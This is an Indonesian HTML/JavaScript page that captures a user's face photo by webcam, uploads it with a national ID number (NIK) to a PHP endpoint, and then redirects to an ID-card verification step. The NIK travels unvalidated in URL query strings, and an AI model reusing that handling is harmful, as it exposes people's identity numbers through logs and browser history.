<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="view/css/bootstrap.min.css" />
    <script src="view/js/bootstrap.min.js"></script>
    <style>
      body,
      html {
        margin: 0;
        padding: 0;
        font-family: "Alatsi-Regular", Helvetica, sans-serif;
        background-color: #dcdcdc;
        height: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .phone-frame {
        background-color: #ffffff;
        width: 360px;
        height: 800px;
        border-radius: 0;
        box-shadow: none;
        position: relative;
        overflow: hidden;
        padding: 20px;
        box-sizing: border-box;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
      }

      .header img {
        width: 120px;
        margin: 0 auto;
        display: block;
      }

      .title {
        text-align: center;
        color: #e16417;
        font-size: 18px;
        margin-top: 10px;
      }

      .camera-preview {
        width: 100%;
        height: 300px;
        background-color: #000;
        border-radius: 10px;
        margin-top: 20px;
        position: relative;
        overflow: hidden;
      }

      video,
      canvas {
        width: 100%;
        height: 100%;
        object-fit: cover;
        display: none;
      }

      .instructions {
        font-size: 11px;
        color: #333;
        margin-top: 20px;
        line-height: 1.4;
        padding: 0 5px;
      }

      .btn-container {
        margin-top: 20px;
        display: flex;
        justify-content: center;
        gap: 10px;
      }

      .btn-camera {
        background-color: #e16417;
        color: #fff;
        border: none;
        border-radius: 5px;
        padding: 10px 20px;
        font-weight: bold;
        font-size: 14px;
        cursor: pointer;
      }

      .footer-logo {
        display: flex;
        justify-content: space-around;
        margin-top: 20px;
      }

      .footer-logo img {
        height: 35px;
      }

      .btn-aksi {
        background-color: #e16417;
        border: none;
        color: white;
        padding: 10px 16px;
        font-size: 12px;
        font-weight: bold;
        border-radius: 8px;
        cursor: pointer;
      }

      .btn-aksi.cancel {
        background-color: #999;
      }
    </style>
  </head>
  <body>
    <div class="phone-frame">
      <div>
        <div class="header">
          <img src="img/money_save.png" alt="Logo" />
        </div>
        <div class="title">Ambil Foto Wajah</div>
        <div class="camera-preview">
          <video id="video" autoplay></video>
          <canvas id="canvas"></canvas>
        </div>
        <div class="instructions">
          Foto harus diambil secara langsung, bukan dari gambar atau lainnya<br />Pastikan
          wajah menghadap tegak ke kamera dan foto tidak buram<br />Posisikan
          wajah kedalam frame supaya dapat terbaca otomatis<br />Carilah ruang
          dengan pencahayaan yang baik dan terang, kualitas gambar mempengaruhi
          proses verifikasi kamu ya!
        </div>
        <div class="btn-container" id="controls">
          <button class="btn-camera" onclick="takePhoto()">Ambil Foto</button>
        </div>
      </div>

      <div class="footer-logo">
        <img src="img/OJK-1.png" alt="OJK" />
        <img src="img/logo-lps-1.png" alt="LPS" />
        <img src="img/logo-bun-1.png" alt="BUN" />
      </div>
    </div>

    <script>
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");
      const controls = document.getElementById("controls");
      let capturedPhoto = null;

      // Get NIK from URL or session
      const urlParams = new URLSearchParams(window.location.search);
      const nik = urlParams.get("nik");

      // Start camera
      navigator.mediaDevices
        .getUserMedia({ video: true })
        .then((stream) => {
          video.srcObject = stream;
          video.style.display = "block";
        })
        .catch((err) => {
          console.error("Gagal mengakses kamera:", err);
          alert("Gagal mengakses kamera. Pastikan Anda memberikan izin.");
        });

      function takePhoto() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        video.style.display = "none";
        canvas.style.display = "block";

        // Stop camera stream
        const stream = video.srcObject;
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());

        controls.innerHTML = `
          <button class="btn-aksi cancel" onclick="cancelPhoto()">ulang</button>
          <button class="btn-aksi" onclick="savePhoto()">benar</button>
        `;
      }

      function cancelPhoto() {
        canvas.style.display = "none";
        video.style.display = "block";
        controls.innerHTML = `
          <button class="btn-camera" onclick="takePhoto()">Ambil Foto</button>
        `;

        // Restart camera
        navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
          video.srcObject = stream;
        });
      }

      async function savePhoto() {
        canvas.toBlob(
          async (blob) => {
            const formData = new FormData();
            formData.append("nik", nik); 
            formData.append("wajah", blob, "wajah_photo.png");

            try {
              const btn = document.querySelector(".btn-aksi:not(.cancel)");
              btn.disabled = true;
              btn.textContent = "Mengunggah...";

              const res = await fetch("save_wajah_photo.php", {
                // endpoint terpadu
                method: "POST",
                body: formData,
              });
              const result = await res.json();

              if (result.success) {
                // lanjut ke halaman verifikasi KTP
                window.location.href = `verifikasi_ktp.php?nik=${encodeURIComponent(
                  nik
                )}`;
              } else {
                alert("Gagal menyimpan foto: " + result.message);
                cancelPhoto();
              }
            } catch (err) {
              console.error(err);
              alert("Terjadi kesalahan saat mengunggah foto");
              cancelPhoto();
            }
          },
          "image/png",
          0.9
        );
      }
    </script>
  </body>
</html>
